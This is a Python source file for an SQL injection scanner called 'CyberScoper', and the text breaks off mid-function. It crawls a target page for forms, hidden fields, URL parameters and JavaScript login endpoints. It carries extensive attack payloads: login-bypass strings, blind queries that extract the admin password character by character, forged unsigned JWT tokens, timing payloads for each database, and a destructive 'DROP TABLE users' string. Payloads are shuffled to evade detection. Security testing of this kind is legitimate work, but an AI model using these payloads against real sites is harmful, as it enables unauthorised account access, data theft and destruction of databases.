import sys
import threading
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs
import queue
import re
import difflib
import time
import random
import os
import json
from datetime import datetime

# Styling imports
from colorama import init, Fore, Style
from termcolor import colored
import pyfiglet

# Ensure color support
init(autoreset=True)

# Styling constants
class HackerStyle:
    # Refined color palette
    NEON_GREEN = '\033[92m'
    NEON_BLUE = '\033[94m'
    NEON_PURPLE = '\033[95m'
    BRIGHT_WHITE = '\033[97m'
    RESET = '\033[0m'

    # Consistent styling
    @staticmethod
    def header(text):
        """Create a clean, highlighted header"""
        return f"{HackerStyle.NEON_BLUE}[*] {text}{HackerStyle.RESET}"

    @staticmethod
    def success(text):
        """Success message styling"""
        return f"{HackerStyle.NEON_GREEN}[+] {text}{HackerStyle.RESET}"

    @staticmethod
    def error(text):
        """Error message styling"""
        return f"\033[91m[!] {text}{HackerStyle.RESET}"

    @staticmethod
    def warning(text):
        """Warning message styling"""
        return f"\033[93m[?] {text}{HackerStyle.RESET}"

    @staticmethod
    def info(text):
        """Info message styling"""
        return f"\033[96m[i] {text}{HackerStyle.RESET}"

    @staticmethod
    def highlight(text, color=NEON_PURPLE):
        """Highlight text with a neon color"""
        return f"{color}{text}{HackerStyle.RESET}"

def create_ascii_banner():
    """Generate a clean, cyberpunk-style ASCII banner"""
    banner = pyfiglet.figlet_format("CyberScoper", font='slant')
    
    # Apply a subtle color gradient
    colored_banner = ""
    colors = [HackerStyle.NEON_GREEN, HackerStyle.NEON_BLUE, HackerStyle.NEON_PURPLE]
    for i, line in enumerate(banner.split('\n')):
        if line.strip():  # Only color non-empty lines
            color = colors[i % len(colors)]
            colored_banner += f"{color}{line}{HackerStyle.RESET}\n"
        else:
            colored_banner += line + '\n'
    
    return colored_banner

def progress_animation(total_steps=10):
    """Create a more sophisticated progress animation"""
    for i in range(total_steps):
        # Progressive loading bar with changing colors
        progress = "#" * (i + 1)
        empty = "." * (total_steps - i - 1)
        color = HackerStyle.NEON_GREEN if i < total_steps // 2 else HackerStyle.NEON_BLUE
        
        # Clear previous line and print new progress
        sys.stdout.write(f"\r{color}Scanning: [{progress}{empty}] {(i+1)*10}%{HackerStyle.RESET}")
        sys.stdout.flush()
        time.sleep(0.1)
    
    # Final newline
    print()

class CyberScoper:
    def __init__(self, target):
        # Startup sequence with refined styling
        self._startup_sequence()
        
        # Core initialization
        self.target = target
        self.payloads = {}  # Dictionary to store categorized payloads
        self.form_data = []
        self.queue = queue.Queue()
        self.results = []
        self.session = requests.Session()
        self.original_responses = {}
        self.scan_start_time = time.time()
        self.scan_end_time = None
        self.detected_forms = {}  # Store form types and their details
        self.cookies = {}  # Store cookies for session handling
        self.csrf_tokens = {}  # Store CSRF tokens
        
        # Initialize detection patterns
        self.initialize_detection_patterns()
        
        # Headers to mimic a real browser
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        }
        
        # Apply headers to the session
        self.session.headers.update(self.headers)

        # Load payloads and print banner
        self.load_payloads()
        self._print_banner()
        self.analyze_target_site()

    def initialize_detection_patterns(self):
        """Initialize patterns used for SQL injection detection"""
        # Comprehensive error indicators by database type
        self.all_error_patterns = [
            # MySQL
            r'mysql.*error',
            r'you have an error in your sql syntax',
            r'warning.*mysql',
            r'unclosed quotation mark after the character string',
            r'quoted string not terminated',
            r'syntax.*mysql',
            r'unknown column.*in',
            
            # PostgreSQL
            r'pg.*error',
            r'postgresql.*error',
            r'unterminated quoted string at or near',
            r'syntax error at or near',
            r'column.*does not exist',
            
            # MSSQL
            r'microsoft.*database.*error',
            r'mssql.*error',
            r'ole db.*error',
            r'unclosed quotation mark after the character string',
            r'incorrect syntax near',
            
            # Oracle
            r'ora-[0-9]+',
            r'oracle.*error',
            r'quoted string not properly terminated',
            r'sql command not properly ended',
            
            # SQLite
            r'sqlite.*error',
            r'syntax error near',
            r'not a valid sql statement',
            r'unrecognized token',
            
            # General
            r'sql.*syntax.*error',
            r'sql.*query.*failed',
            r'syntax.*error',
            r'unclosed.*quotation',
            r'unterminated.*string',
            r'warning.*supplied.*argument',
            r'exception.*occurred',
            r'database.*error',
            r'unexpected.*token',
        ]
        
        # Define success indicators for different form types
        self.form_success_indicators = {
            # Login forms
            "login_with_email": [
                r'welcome',
                r'dashboard',
                r'logged in',
                r'sign out',
                r'account',
                r'profile',
                r'session',
                r'authenticated',
                r'successful',
                r'user id',
                r'you are now logged in',
                r'my account',
            ],
            "login_with_username": [
                r'welcome',
                r'dashboard',
                r'logged in',
                r'sign out',
                r'account',
                r'profile',
                r'session',
                r'authenticated',
                r'successful',
                r'user id',
                r'you are now logged in',
                r'my account',
            ],
            "login_with_email_username": [
                r'welcome',
                r'dashboard',
                r'logged in',
                r'sign out',
                r'account',
                r'profile',
                r'session',
                r'authenticated',
                r'successful',
                r'user id',
                r'you are now logged in',
                r'my account',
            ],
            "login_generic": [
                r'welcome',
                r'dashboard',
                r'logged in',
                r'sign out',
                r'account',
                r'profile',
                r'session',
                r'authenticated',
                r'successful',
                r'user id',
                r'you are now logged in',
                r'my account',
            ],
            "login_by_action": [
                r'welcome',
                r'dashboard',
                r'logged in',
                r'sign out',
                r'account',
                r'profile',
                r'session',
                r'authenticated',
                r'successful',
                r'user id',
                r'you are now logged in',
                r'my account',
            ],
            "login_by_text": [
                r'welcome',
                r'dashboard',
                r'logged in',
                r'sign out',
                r'account',
                r'profile',
                r'session',
                r'authenticated',
                r'successful',
                r'user id',
                r'you are now logged in',
                r'my account',
            ],
            # API/JS-based authentication
            "js_authentication": [
                r'token',
                r'success.*true',
                r'authenticated.*true',
                r'status.*success',
                r'user.*id',
                r'session.*created',
                r'200 ok',
                r'"logged_in":\s*true',
                r'"authenticated":\s*true',
            ],
            # OAuth
            "oauth_login": [
                r'token',
                r'access.*granted',
                r'authorization',
                r'oauth',
                r'authenticated',
                r'success.*true',
            ],
            # Multi-factor auth
            "multi_factor_auth": [
                r'verified',
                r'success',
                r'auth.*complete',
                r'second.*factor',
                r'authenticated',
            ],
            # Search forms
            "search": [
                r'search\s*results',
                r'found\s*[0-9]+\s*results',
                r'no\s*results\s*found',
                r'matches\s*for'
            ],
            # Registration forms
            "registration": [
                r'account\s*created',
                r'registered\s*successfully',
                r'verification\s*email',
                r'confirm\s*your\s*email'
            ]
        }
        
        # Generic success indicators for forms not in the above mapping
        self.generic_success_indicators = [
            r'success',
            r'completed',
            r'processed',
            r'welcome',
            r'authenticated',
            r'authorized',
            r'submitted',
            r'thank you',
            r'confirmation'
        ]
        
        # Patterns to detect sensitive data exposure
        self.sensitive_data_patterns = [
            r'password\s*[:=]\s*[\'"][^\'"]+[\'"]',
            r'user.+password',
            r'select.+from.+users',
            r'dump',
            r'database\s*:',
            r'admin.+password',
            r'root\s*:',
            r'mysql\.user',
            r'information_schema',
            r'user_id\s*[:=]\s*[0-9]+',
            r'<td>[^<]+</td><td>[^<]+</td>',  # Table data
            r'username\s*[:=]\s*[\'"][^\'"]+[\'"]',
            r'email\s*[:=]\s*[\'"][^\'"]+[\'"]',
            r'admin\s*[:=]\s*[\'"][^\'"]+[\'"]',
            r'id\s*[:=]\s*[0-9]+',
            r'sql\s*query',
            r'sql\s*statement',
            r'query\s*result',
            r'database\s*result',
            r'table\s*content',
            r'result\s*set',
            r'([a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+)',  # Email regex
            r'[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}',    # IP address
            r'(SELECT|UPDATE|INSERT|CREATE|DELETE|DROP).*FROM',   # SQL queries
        ]
        
        # Patterns to identify common web page elements (to reduce false positives)
        self.common_web_patterns = [
            # HTML/CSS common fragments
            r'<div', r'<span', r'<p>', r'<table', r'class=', r'style=',
            # Common JavaScript
            r'function', r'var ', r'const ', r'document\.', r'window\.',
            # Common form elements
            r'input', r'button', r'submit', r'form',
            # Common message fragments
            r'error', r'warning', r'notice', r'alert'
        ]
        
        # Authentication bypass patterns
        self.auth_bypass_patterns = [
            r'welcome',
            r'logged in',
            r'dashboard',
            r'admin',
            r'profile',
            r'account',
            r'session',
            r'sign out',
            r'logout',
            r'authorized',
            r'authenticated',
            r'user area',
            r'member',
            r'control panel'
        ]

    def _startup_sequence(self):
        """Refined startup sequence with cleaner animations"""
        print(HackerStyle.header("Initializing CyberScoper Protocol"))
        time.sleep(0.5)
        progress_animation()
        print(HackerStyle.success("System Handshake Complete"))
        time.sleep(0.3)

    def _print_banner(self):
        """Enhanced, cleaner banner presentation"""
        # Print ASCII banner
        print(create_ascii_banner())
        
        # Target information with refined styling
        print(HackerStyle.header(f"Target: {HackerStyle.highlight(self.target, HackerStyle.BRIGHT_WHITE)}"))
        print(HackerStyle.header("Enhanced Scanner for SQL Injection Vulnerabilities"))
        print("-" * 50)

    def generate_report(self):
        """Generate a comprehensive, stylized text report"""
        # Ensure results directory exists
        os.makedirs('cyberscoper_reports', exist_ok=True)
        
        # Generate filename with timestamp
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f'cyberscoper_reports/vulnerability_report_{timestamp}.txt'
        
        # Calculate scan duration
        self.scan_end_time = time.time()
        scan_duration = self.scan_end_time - self.scan_start_time

        # Create report content
        report_content = [
            "=" * 70,
            f"{'CYBERSCOPER VULNERABILITY REPORT':^70}",
            "=" * 70,
            f"\nScan Target: {self.target}",
            f"Scan Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            f"Scan Duration: {scan_duration:.2f} seconds",
            "\n" + "=" * 70,
            "SITE ANALYSIS",
            "=" * 70,
            "\nDetected Forms:",
        ]
        
        # Add detected forms info
        for form_url, form_type in self.detected_forms.items():
            report_content.append(f"  - {form_url} (Type: {form_type})")
        
        # Add vulnerability details
        report_content.extend([
            "\n" + "=" * 70,
            "VULNERABILITY DETAILS",
            "=" * 70
        ])

        if self.results:
            report_content.append(f"\nVulnerabilities Discovered: {len(self.results)}")
            report_content.append("-" * 70)
            
            for i, (payload, action, form_type) in enumerate(self.results, 1):
                report_content.extend([
                    f"Vulnerability #{i}:",
                    f"  Form Type: {form_type}",
                    f"  Payload: {payload}",
                    f"  Endpoint: {action}",
                    "-" * 70
                ])
        else:
            report_content.append("\nNo Vulnerabilities Detected")

        report_content.extend([
            "\n" + "=" * 70,
            f"{'END OF REPORT':^70}",
            "=" * 70
        ])

        # Write report to file
        with open(filename, 'w') as f:
            f.write('\n'.join(report_content))

        # Return filename for reference
        return filename

    def load_payloads(self):
        """Enhanced payload categories with special focus on modern auth systems"""
        # General purpose payloads (for any input type)
        general_injections = [
            "' OR 1=1 --", 
            "' OR '1'='1", 
            "\" OR \"1\"=\"1", 
            "1' OR '1'='1",
            "1 OR 1=1",
            "' OR 1=1 #",
            "' OR 1=1 /*",
            "admin' --", 
            "1' AND 1=1 --",
        ]
        
        # Email-specific payloads with more variations
        email_injections = [
            "admin@example.com' OR 1=1--",
            "' OR 1=1 -- a@a.com",
            "a@a.com' OR 1=1--",
            "' UNION SELECT 'admin@example.com',1,1--",
            # Email with SQL comments
            "admin@example.com'/**/OR/**/1=1--",
            # URL encoded variations
            "admin%40example.com%27%20OR%201%3D1--",
            # Special characters in email
            "a'@a.com' OR 1=1--",
            "admin+test@example.com' OR '1'='1",
            # Case variations
            "ADMIN@example.com' OR 1=1--",
            # Different email domains
            "admin@gmail.com' OR 1=1--",
            "admin@email.com' OR 1=1--", 
            # JSON injection attempts (for API-based auth)
            "\",\"password\":\"any\" --",
            "\\\"},{\\\"authenticated\\\":true,\\\"user\\\":\\\"admin",
        ]
        
        # Username-specific payloads with more variations  
        username_injections = [
            "admin' --",
            "admin'#",
            "admin' OR '1'='1",
            "' OR username LIKE '%admin%'--",
            "' OR user LIKE '%admin%'--",  # Variation for 'user' column
            "' OR username IS NOT NULL --",
            "admin'; --",
            "admin'/**/OR/**/1=1--",  # Comment variation  
            "admin'; DROP TABLE users--",
            # More admin variations
            "administrator' --",
            "root' --",
            "superuser' --",
            # Common username variations
            "user' OR 1=1--",
            "guest' OR 1=1--",
            # Different case variations
            "ADMIN' OR 1=1--",
            "Admin' OR 1=1--",
            # Whitespace variations
            "admin'OR'1'='1",
            "admin'    OR    '1'='1",
            # Double quotes for systems that use them
            "admin\" OR \"1\"=\"1",
        ]
        
        # Password-specific payloads with more variations
        password_injections = [
            "' OR 1=1 --",
            "password' OR '1'='1",
            "' OR password IS NOT NULL --",
            "' OR length(password)>0 --",
            "' OR password LIKE '%a%' --",
            "' OR 1=1#",
            "' OR 1=1/*",
            "xxx' OR 1='1",
            "' OR '1'='1",
            # Comment variations
            "'/**/OR/**/1=1--",
            # Double quote variations for systems that use them
            "\" OR 1=1 --",
            "\" OR \"1\"=\"1",
            # Whitespace variations
            "'OR'1'='1",
            "' OR 1 = 1 --",
            # Boolean injection
            "' OR TRUE --",
            "' OR 1<>2 --",
        ]
        
        # Add new category for JWT or token-based authentication
        token_injections = [
            # JWT header modifications
            "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=.eyJpZCI6MTIzNDU2Nzg5MCwibmFtZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ==.",
            # JWT with modified claims
            "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6MSwidXNlcm5hbWUiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMn0=.XSqoJJhzCn6W2EB-o-8FpDVXJZx9a80hbppT2NxHE8E",
            # Basic SQL injection attempts on token fields
            "' OR 1=1 --",
            "1' OR '1'='1",
            # Token format manipulations
            "token' OR 1=1 --",
            "Bearer ' OR 1=1 --",
            "{ \"auth\": true }",
        ]
        
        # Add variations for multi-factor authentication
        mfa_injections = [
            "' OR 1=1 --",
            "123456' OR '1'='1",
            "000000' OR 1=1 --",
            "123456",
            "111111",
            "999999",
        ]
        
        # Blind SQL Injection Payloads (for all types)
        blind_injections = [
            "' AND 1=1--",
            "' AND 1=2--",
            "' AND (SELECT COUNT(*) FROM users)>0--",
            # Time-based blind
            "' AND (SELECT 1 FROM pg_sleep(2))--",
            "' AND SLEEP(2)--",
            "' AND WAITFOR DELAY '0:0:2'--",
            # Error-based blind
            "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--",
            "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--",
            "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--",
            # Boolean-based blind
            "' AND substring((SELECT password FROM users WHERE username='admin'),1,1)='a'--",
            "' AND ASCII(substring((SELECT password FROM users WHERE username='admin'),1,1))>96--",
        ]
        
        # More database-specific payloads
        database_specific = {
            "mysql": [
                "' AND IF(1=1,SLEEP(2),0)--",
                "' AND (SELECT 1 FROM mysql.user LIMIT 1)=1--",
                "' AND (SELECT BENCHMARK(5000000,MD5('a')))--",
                "' AND ELT(1=1,SLEEP(2),0)--",
                "' AND SLEEP(2) AND 'a'='a", 
            ],
            "postgresql": [
                "' AND pg_sleep(2)--",
                "' AND (SELECT 1 FROM pg_user LIMIT 1)=1--",
                "' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(2) ELSE 0 END)--",
                "' AND 1=(SELECT 1 FROM PG_SLEEP(2))--",
            ],
            "mssql": [
                "' AND WAITFOR DELAY '0:0:2'--",
                "' AND 1=(SELECT CASE WHEN 1=1 THEN 1 ELSE 1/0 END)--",
                "'; IF 1=1 WAITFOR DELAY '0:0:2'--",
                "'; WAITFOR DELAY '0:0:2'--",
            ],
            "oracle": [
                "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',2)--",
                "' AND 1=(SELECT CASE WHEN 1=1 THEN 1 ELSE 1/0 END FROM dual)--",
                "' AND 1=(SELECT COUNT(*) FROM all_tables)--",
            ],
            "sqlite": [
                "' AND (SELECT sqlite_version())IS NOT NULL--",
                "' AND 1=(SELECT CASE WHEN 1=1 THEN 1 ELSE 1/0 END)--",
                "' AND (SELECT CASE WHEN 1=1 THEN LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(300000000/2)))) ELSE 1 END)--",
            ]
        }
        
        # Specific payloads for modern frameworks
        framework_specific = {
            "graphql": [
                "{ \"query\": \"mutation { login(username: \\\"admin\\\", password: \\\"password\\\" OR 1=1) { token } }\" }",
                "{ \"query\": \"query { user(id: 1 OR 1=1) { username } }\" }",
            ],
            "rest_api": [
                "{\"username\":\"admin\",\"password\":\"password' OR '1'='1\"}",
                "{\"email\":\"admin@example.com\",\"password\":\"' OR 1=1 --\"}",
            ],
            "oauth": [
                "access_token=' OR '1'='1",
                "code=' OR 1=1 --",
            ]
        }
        
        # Store all payloads in categorized dictionary
        self.payloads = {
            "general": general_injections,
            "email": email_injections,
            "username": username_injections,
            "password": password_injections,
            "search": self.payloads.get("search", []),
            "hidden": self.payloads.get("hidden", []),
            "numeric": self.payloads.get("numeric", []),
            "date": self.payloads.get("date", []),
            "token": token_injections,
            "mfa": mfa_injections,
            "blind": blind_injections,
            "database_specific": database_specific,
            "framework_specific": framework_specific
        }
        
        # Add some randomization to avoid detection patterns
        for category in self.payloads:
            if isinstance(self.payloads[category], list):
                random.shuffle(self.payloads[category])

    def analyze_target_site(self):
        """Analyze ONLY the target URL with enhanced HTML structure analysis"""
        print(HackerStyle.header("Analyzing Target Page..."))
        
        try:
            # Initial visit to the target page ONLY
            response = self.session.get(self.target, timeout=10)
            self.cookies.update(self.session.cookies.get_dict())
            
            # Parse the target page
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Standard form detection
            standard_forms_found = False
            forms = soup.find_all('form')
            if forms:
                standard_forms_found = True
                for form in forms:
                    form_details = self.get_form_details(form)
                    inputs = self.analyze_form_inputs(form, self.target)
                    form_type = self.determine_form_type(form, inputs)
                    
                    # Store form type for reporting
                    self.detected_forms[form_details['action']] = {
                        "type": form_type,
                        "inputs": inputs
                    }
            
            # If no standard forms found, try enhanced HTML structure analysis
            if not standard_forms_found or len(self.detected_forms) == 0:
                print(HackerStyle.warning("No standard forms detected. Performing deep HTML analysis..."))
                self.analyze_html_structure(soup, self.target)
            
            # Summary of detected forms
            if self.detected_forms:
                print(HackerStyle.success(f"Analysis Complete - Detected {len(self.detected_forms)} forms/input points on the target page"))
                for form_url, form_info in self.detected_forms.items():
                    print(HackerStyle.info(f"  - {form_info['type']} at {form_url}"))
            else:
                print(HackerStyle.warning("No forms or input points detected on the target page"))
            
            # Fetch original responses for detected forms
            self.fetch_original_responses()
                    
        except Exception as e:
            print(HackerStyle.error(f"Error analyzing target page: {e}"))

    def analyze_html_structure(self, soup, page_url):
        """Thoroughly analyze HTML structure to find all possible input points"""
        print(HackerStyle.header("Analyzing HTML structure for input points..."))
        
        # 1. Find all standard form elements
        forms = soup.find_all('form')
        standard_form_count = len(forms)
        print(HackerStyle.info(f"Found {standard_form_count} standard HTML forms"))
        
        # 2. Look for inputs outside of forms (non-standard forms)
        all_inputs = soup.find_all(['input', 'textarea', 'select'])
        inputs_outside_forms = []
        
        for input_tag in all_inputs:
            # Check if this input is within a form
            parent_form = input_tag.find_parent('form')
            if not parent_form:
                inputs_outside_forms.append(input_tag)
        
        if inputs_outside_forms:
            print(HackerStyle.info(f"Found {len(inputs_outside_forms)} input elements outside of forms"))
            
            # Create synthetic forms for these inputs
            for i, input_tag in enumerate(inputs_outside_forms):
                synthetic_form = {
                    "action": page_url,  # Assume submission to same page
                    "method": "post",    # Assume POST method
                    "inputs": [{
                        "type": input_tag.get("type", "text"),
                        "name": input_tag.get("name", f"unnamed_input_{i}"),
                        "value": input_tag.get("value", ""),
                        "placeholder": input_tag.get("placeholder", "")
                    }]
                }
                
                # Only add if input has a name attribute
                if input_tag.get("name"):
                    input_purpose = self.determine_input_purpose(input_tag)
                    form_type = f"synthetic_{input_purpose}_input"
                    self.detected_forms[f"{page_url}#input_{input_tag.get('name')}"] = {
                        "type": form_type,
                        "inputs": [{"name": input_tag.get("name"), "type": input_tag.get("type", "text"), "purpose": input_purpose}]
                    }
                    print(HackerStyle.info(f"  - Added synthetic form for {input_tag.get('name')} ({input_purpose})"))
        
        # 3. Look for JavaScript-based forms and inputs
        scripts = soup.find_all('script')
        js_form_indicators = 0
        
        for script in scripts:
            script_content = script.string or ""
            
            # Look for form handling in JavaScript
            if (re.search(r'getElementById\([\'"].*?[\'"]', script_content) and 
                re.search(r'\.value', script_content)):
                js_form_indicators += 1
                
            # Look for form submission in JavaScript
            if (re.search(r'submit\(\)', script_content) or 
                re.search(r'fetch\(|\.ajax\(|\.post\(', script_content)):
                js_form_indicators += 1
        
        if js_form_indicators > 0:
            print(HackerStyle.info(f"Detected {js_form_indicators} JavaScript form handling indicators"))
            
            # Try to find form elements that might be controlled by JS
            js_elements = soup.select('[id],[name],[onclick],[onsubmit]')
            potential_js_inputs = []
            
            for element in js_elements:
                # Look for elements that look like inputs or have event handlers
                if (element.has_attr('id') and 
                    (element.name in ['input', 'textarea', 'select'] or 
                     element.has_attr('onclick') or 
                     element.has_attr('onchange'))):
                    if element.name not in ['input', 'textarea', 'select']:
                        # This might be a custom input element
                        potential_js_inputs.append(element)
            
            if potential_js_inputs:
                print(HackerStyle.info(f"Found {len(potential_js_inputs)} potential JavaScript-controlled input elements"))
                
                # Extract info for these elements
                for i, element in enumerate(potential_js_inputs):
                    element_id = element.get('id', f"js_element_{i}")
                    element_name = element.get('name', element_id)
                    
                    # Create a synthetic form for this element
                    if element_id or element_name:
                        input_purpose = "generic"
                        if "user" in element_id.lower() or "user" in element_name.lower():
                            input_purpose = "username"
                        elif "pass" in element_id.lower() or "pass" in element_name.lower():
                            input_purpose = "password"
                        elif "email" in element_id.lower() or "email" in element_name.lower():
                            input_purpose = "email"
                        
                        form_type = f"js_{input_purpose}_input"
                        entry_name = element_name or element_id
                        
                        self.detected_forms[f"{page_url}#js_{entry_name}"] = {
                            "type": form_type,
                            "inputs": [{"name": entry_name, "type": "text", "purpose": input_purpose}]
                        }
                        print(HackerStyle.info(f"  - Added JavaScript input element: {entry_name} ({input_purpose})"))
        
        # 4. Analyze URL parameters as potential injection points
        parsed_url = urlparse(page_url)
        if parsed_url.query:
            query_params = parse_qs(parsed_url.query)
            if query_params:
                print(HackerStyle.info(f"Found {len(query_params)} URL parameters that could be injection points"))
                
                for param_name in query_params:
                    # Determine parameter purpose
                    param_purpose = "generic"
                    if "id" in param_name.lower():
                        param_purpose = "identifier"
                    elif "search" in param_name.lower() or "query" in param_name.lower():
                        param_purpose = "search"
                    
                    # Create a synthetic form for URL parameters
                    self.detected_forms[f"{page_url}#param_{param_name}"] = {
                        "type": f"url_{param_purpose}_parameter",
                        "inputs": [{"name": param_name, "type": "text", "purpose": param_purpose}]
                    }
                    print(HackerStyle.info(f"  - Added URL parameter: {param_name} ({param_purpose})"))
        
        # 5. Look for HTML5 data attributes that might indicate inputs
        data_elements = soup.select('[data-bind],[data-value],[data-input]')
        if data_elements:
            print(HackerStyle.info(f"Found {len(data_elements)} HTML5 data attributes that might be inputs"))
            
            for i, element in enumerate(data_elements):
                attr_name = None
                for attr in element.attrs:
                    if attr.startswith('data-') and (
                        'value' in attr or 'input' in attr or 'bind' in attr or 'field' in attr):
                        attr_name = element.attrs[attr]
                        break
                        
                if attr_name:
                    input_purpose = "generic"
                    if "user" in attr_name.lower():
                        input_purpose = "username"
                    elif "pass" in attr_name.lower():
                        input_purpose = "password"
                    elif "email" in attr_name.lower():
                        input_purpose = "email"
                    
                    self.detected_forms[f"{page_url}#data_{attr_name}"] = {
                        "type": f"html5_{input_purpose}_attribute",
                        "inputs": [{"name": attr_name, "type": "text", "purpose": input_purpose}]
                    }
                    print(HackerStyle.info(f"  - Added HTML5 data attribute: {attr_name} ({input_purpose})"))
        
        # Summary
        total_input_points = len(self.detected_forms)
        print(HackerStyle.success(f"Total input points identified: {total_input_points}"))
        if total_input_points == 0:
            print(HackerStyle.warning("No input points found. The page might use JavaScript frameworks or custom elements."))
            
            # Suggest manual analysis for JavaScript-heavy pages
            if js_form_indicators > 0:
                print(HackerStyle.info("Page uses JavaScript for form handling. Consider manual analysis."))
                
        return total_input_points > 0

    def determine_input_purpose(self, input_tag):
        """Determine the purpose of an input based on its attributes and context"""
        input_type = input_tag.get("type", "text")
        input_name = input_tag.get("name", "").lower()
        input_id = input_tag.get("id", "").lower()
        input_class = " ".join(input_tag.get("class", [])).lower()
        input_placeholder = input_tag.get("placeholder", "").lower()
        
        # Check input type first (most reliable)
        if input_type == "password":
            return "password"
        elif input_type == "email":
            return "email"
        elif input_type == "search":
            return "search"
        elif input_type == "hidden":
            if any(token_name in input_name for token_name in ["token", "csrf", "nonce"]):
                return "token"
            else:
                return "hidden"
                
        # Check name attribute
        if any(user_term in input_name for user_term in ["username", "user", "login", "account", "name"]):
            return "username"
        elif any(email_term in input_name for email_term in ["email", "mail", "e-mail"]):
            return "email"
        elif any(pass_term in input_name for pass_term in ["password", "pass", "pwd"]):
            return "password"
        elif any(search_term in input_name for search_term in ["search", "query", "find", "lookup"]):
            return "search"
            
        # Check id attribute
        if any(user_term in input_id for user_term in ["username", "user", "login", "account", "name"]):
            return "username"
        elif any(email_term in input_id for email_term in ["email", "mail", "e-mail"]):
            return "email"
        elif any(pass_term in input_id for pass_term in ["password", "pass", "pwd"]):
            return "password"
        elif any(search_term in input_id for search_term in ["search", "query", "find", "lookup"]):
            return "search"
            
        # Check placeholder
        if input_placeholder:
            if any(user_term in input_placeholder for user_term in ["username", "user", "login", "account", "name"]):
                return "username"
            elif any(email_term in input_placeholder for email_term in ["email", "mail", "e-mail"]):
                return "email"
            elif any(pass_term in input_placeholder for pass_term in ["password", "pass", "pwd"]):
                return "password"
            elif any(search_term in input_placeholder for search_term in ["search", "query", "find", "lookup"]):
                return "search"
        
        # Check context (surrounding labels)
        parent = input_tag.parent
        if parent:
            parent_text = parent.get_text().lower()
            if "username" in parent_text or "user " in parent_text or "login" in parent_text:
                return "username"
            elif "email" in parent_text or "e-mail" in parent_text:
                return "email"
            elif "password" in parent_text:
                return "password"
            elif "search" in parent_text:
                return "search"
                
            # Look for associated label tags
            if input_id:
                label = parent.find('label', attrs={"for": input_id})
                if label:
                    label_text = label.get_text().lower()
                    if "username" in label_text or "user " in label_text or "login" in label_text:
                        return "username"
                    elif "email" in label_text or "e-mail" in label_text:
                        return "email"
                    elif "password" in label_text:
                        return "password"
                    elif "search" in label_text:
                        return "search"
        
        # Default to generic if no specific purpose detected
        return "generic"

    def analyze_js_auth(self):
        """Analyze JavaScript-based authentication systems"""
        try:
            # Get the main page again to analyze its JavaScript
            response = self.session.get(self.target, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Look for script tags and potential AJAX endpoints
            scripts = soup.find_all('script')
            potential_endpoints = set()
            
            # Common patterns in JavaScript auth
            auth_patterns = [
                r'\.post\s*\(\s*[\'"]([^"\'\)]+)[\'"]',  # jQuery $.post()
                r'\.ajax\s*\(\s*\{[^\}]*url\s*:\s*[\'"]([^"\'\)]+)[\'"]',  # jQuery $.ajax()
                r'axios\.post\s*\(\s*[\'"]([^"\'\)]+)[\'"]',  # axios.post()
                r'fetch\s*\(\s*[\'"]([^"\'\)]+)[\'"]',  # fetch API
                r'new\s+XMLHttpRequest\(\).*\.open\s*\(\s*[\'"]POST[\'"],\s*[\'"]([^"\'\)]+)[\'"]',  # XMLHttpRequest
                r'method:\s*[\'"]POST[\'"],\s*url:\s*[\'"]([^"\'\)]+)[\'"]',  # Generic object config
                r'login|signin|auth|authenticate',  # Generic keywords for auth endpoints
            ]
            
            # Extract all external script sources
            script_srcs = [script.get('src') for script in scripts if script.get('src')]
            
            # Analyze inline scripts for potential endpoints
            for script in scripts:
                if script.string:
                    for pattern in auth_patterns:
                        matches = re.findall(pattern, script.string, re.IGNORECASE)
                        for match in matches:
                            # Ensure it's a relative path or same domain
                            if not match.startswith('http') or urlparse(self.target).netloc in match:
                                potential_endpoints.add(match)
            
            # Try to load and analyze external scripts
            for src in script_srcs:
                try:
                    script_url = urljoin(self.target, src)
                    script_response = self.session.get(script_url, timeout=5)
                    
                    if script_response.status_code == 200:
                        for pattern in auth_patterns:
                            matches = re.findall(pattern, script_response.text, re.IGNORECASE)
                            for match in matches:
                                # Ensure it's a relative path or same domain
                                if not match.startswith('http') or urlparse(self.target).netloc in match:
                                    potential_endpoints.add(match)
                except Exception as e:
                    print(HackerStyle.warning(f"Could not analyze script {src}: {e}"))
            
            # Process found endpoints
            if potential_endpoints:
                print(HackerStyle.success(f"Found {len(potential_endpoints)} potential JS authentication endpoints"))
                
                for endpoint in potential_endpoints:
                    endpoint_url = urljoin(self.target, endpoint)
                    print(HackerStyle.info(f"  - Potential JS auth endpoint: {endpoint_url}"))
                    
                    # Create a synthetic form for each potential endpoint
                    self.detected_forms[endpoint_url] = "js_authentication"
                    
                    # Add common fields for testing
                    fake_form = {
                        "action": endpoint_url,
                        "method": "post",
                        "inputs": [
                            {"type": "text", "name": "username", "value": ""},
                            {"type": "text", "name": "email", "value": ""},
                            {"type": "password", "name": "password", "value": ""},
